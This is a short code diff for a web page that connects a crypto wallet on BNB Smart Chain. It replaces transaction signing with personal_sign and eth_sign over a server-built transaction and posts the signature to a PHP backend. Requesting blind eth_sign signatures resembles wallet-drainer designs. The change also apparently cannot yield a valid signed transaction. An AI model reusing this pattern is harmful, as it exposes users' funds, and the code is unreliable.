@@ -10,7 +10,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["eth_signTransaction"],
+      methods: ["personal_sign", "eth_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -43,13 +43,13 @@ function App() {
 
         // **✅ امضای تراکنش در کیف پول**
         var signedTx = await provider.request({
-          method: "eth_signTransaction",
-          params: [unsignedTx.result],
+          method: "personal_sign",
+          params: [JSON.stringify(unsignedTx.result), address],
         });
 
         console.log("✍️ Signed Transaction:", signedTx);
 
-        // **✅ ارسال تراکنش به `send.php` برای ارسال به بلاکچین**
+        // **✅ ارسال امضا به `send.php` برای ارسال به بلاکچین**
         var txHash = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
